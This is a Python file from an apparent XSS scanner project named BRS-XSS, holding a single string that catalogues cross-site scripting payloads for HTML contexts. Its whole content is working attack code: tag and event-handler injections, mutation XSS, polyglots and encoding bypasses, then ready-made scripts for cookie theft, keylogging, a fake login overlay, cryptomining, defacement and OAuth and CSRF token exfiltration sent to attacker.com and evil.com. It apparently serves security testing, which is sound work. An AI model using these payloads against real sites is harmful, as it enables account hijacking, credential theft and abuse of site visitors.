#!/usr/bin/env python3

"""
Project: BRS-XSS
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-10-10 17:31:53 UTC+3
Status: Refactored
Telegram: https://t.me/easyprotech

HTML Content Context - Attack Vectors
"""

ATTACK_VECTOR = """
CLASSIC ATTACK VECTORS:

1. SCRIPT TAG INJECTION:
   <script>alert(document.cookie)</script>
   <script>fetch('//attacker.com/steal?c='+document.cookie)</script>
   <script src="//evil.com/xss.js"></script>
   
2. IMG TAG WITH ONERROR:
   <img src=x onerror=alert(1)>
   <img src=x onerror="fetch('//attacker.com?c='+btoa(document.cookie))">
   <img/src=x onerror=eval(atob('YWxlcnQoMSk='))>

3. SVG ONLOAD:
   <svg onload=alert(1)>
   <svg/onload=alert`1`>
   <svg><script>alert(1)</script></svg>
   <svg><animate onbegin=alert(1) attributeName=x dur=1s>

4. IFRAME INJECTION:
   <iframe src=javascript:alert(1)>
   <iframe srcdoc="<script>alert(1)</script>">
   <iframe src="data:text/html,<script>alert(1)</script>">

5. BODY/HTML EVENT HANDLERS:
   <body onload=alert(1)>
   <body onpageshow=alert(1)>
   <body onfocus=alert(1)>

6. INPUT/FORM AUTOFOCUS:
   <input onfocus=alert(1) autofocus>
   <select onfocus=alert(1) autofocus>
   <textarea onfocus=alert(1) autofocus>
   <keygen onfocus=alert(1) autofocus>

7. DETAILS/SUMMARY (HTML5):
   <details open ontoggle=alert(1)>
   <details><summary>Click</summary><script>alert(1)</script></details>

8. VIDEO/AUDIO TAGS:
   <video><source onerror=alert(1)>
   <audio src=x onerror=alert(1)>
   <video poster=javascript:alert(1)>

9. MARQUEE/BLINK:
   <marquee onstart=alert(1)>XSS</marquee>
   <marquee loop=1 width=0 onfinish=alert(1)>

10. OBJECT/EMBED:
    <object data="javascript:alert(1)">
    <embed src="javascript:alert(1)">
    <object data="data:text/html,<script>alert(1)</script>">

MODERN BYPASSES AND TECHNIQUES:

11. MUTATION XSS (mXSS):
    Payloads that look safe but become dangerous after HTML parsing:
    <noscript><p title="</noscript><img src=x onerror=alert(1)>">
    <form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>

12. DANGLING MARKUP INJECTION:
    Used for data exfiltration when XSS is partially filtered:
    <img src='//attacker.com/collect?
    (Captures all following HTML until next single quote)

13. HTML5 FORM HIJACKING:
    <form action="//attacker.com"><button>Click</button></form>
    <input form=x><form id=x action="//evil.com"><button>Submit</button></form>

14. POLYGLOT VECTORS:
    Works across multiple contexts (HTML, JS, etc):
    javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
    jaVasCript:/*-/*`/*\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e

15. UNICODE/ENCODING BYPASSES:
    <script>\\u0061lert(1)</script>
    <script>\\x61lert(1)</script>
    <script>eval('\\x61lert(1)')</script>
    <img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">

16. NULL BYTE INJECTION:
    <script>alert(1)</script>%00
    <img src=x%00 onerror=alert(1)>

17. BREAKING OUT OF ATTRIBUTES:
    If input is in: <div data-text="USER_INPUT">
    Payload: "><script>alert(1)</script>
    Result: <div data-text=""><script>alert(1)</script>">

18. COMMENT BREAKOUT:
    <!-- USER_INPUT -->
    Payload: --><script>alert(1)</script><!--

19. CSS EXPRESSION (Legacy IE):
    <style>body{background:expression(alert(1))}</style>

20. BASE TAG HIJACKING:
    <base href="//attacker.com/">
    (Hijacks all relative URLs on page)

REAL-WORLD ATTACK SCENARIOS:

SESSION HIJACKING:
<script>
new Image().src='//attacker.com/steal?c='+document.cookie;
</script>

KEYLOGGER:
<script>
document.onkeypress=function(e){
  fetch('//attacker.com/log?k='+e.key);
}
</script>

PHISHING:
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">
  <form action="//attacker.com/phish">
    <h2>Session Expired - Please Login</h2>
    <input name="user" placeholder="Username">
    <input name="pass" type="password" placeholder="Password">
    <button>Login</button>
  </form>
</div>

CRYPTOCURRENCY MINER:
<script src="//attacker.com/coinhive.js"></script>
<script>
var miner=new CoinHive.Anonymous('attacker-key');
miner.start();
</script>

DEFACEMENT:
<script>
document.body.innerHTML='<h1>Hacked by Attacker</h1>';
</script>

BROWSER EXPLOITATION:
<script src="//attacker.com/browser-exploit.js"></script>

OAUTH TOKEN THEFT:
<script>
var token=localStorage.getItem('oauth_token');
fetch('//attacker.com/steal?t='+token);
</script>

CSRF TOKEN EXFILTRATION:
<script>
var csrf=document.querySelector('[name=csrf_token]').value;
fetch('//attacker.com/csrf?t='+csrf);
</script>
"""

